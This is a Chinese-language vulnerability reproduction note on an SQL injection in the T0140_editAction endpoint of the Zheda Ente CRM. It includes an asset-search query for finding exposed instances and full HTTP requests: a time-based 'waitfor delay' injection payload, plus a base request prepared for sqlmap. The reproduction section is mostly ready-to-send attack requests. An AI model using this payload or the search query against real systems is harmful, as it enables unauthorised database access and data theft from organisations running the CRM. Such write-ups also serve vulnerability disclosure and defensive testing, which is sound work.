# 浙大恩特CRM T0140_editAction SQL注入漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM T0140_editAction 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">hunter</font>`<font style="color:rgba(0, 0, 0, 0.9);">app.name="浙大恩特 CRM"</font>`
+ <font style="color:rgba(0, 0, 0, 0.9);">特征</font>

![1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a.png](./img/f1wXP9KnVWY_4fwQ/1700034640158-a0b751ed-9499-471d-aef1-96b75913aa5a-053269.png)

# <font style="color:rgba(0, 0, 0, 0.9);">四、漏洞复现</font>
```plain
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1';waitfor+delay+'0:0:5'-- HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![1700315256759-7e924cad-9094-47c7-a60b-487d3bfd9a64.png](./img/f1wXP9KnVWY_4fwQ/1700315256759-7e924cad-9094-47c7-a60b-487d3bfd9a64-902360.png)

sqlmap

```plain
GET /entsoft/T0140_editAction.entweb;.js?method=getdocumentnumFlag&documentnum=1 HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
```

![1700315422038-72774add-b8ed-4117-befd-062ca7dd8bbb.png](./img/f1wXP9KnVWY_4fwQ/1700315422038-72774add-b8ed-4117-befd-062ca7dd8bbb-897323.png)



> 更新: 2024-02-29 23:55:45  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pn2h4x4cw2ylpgty>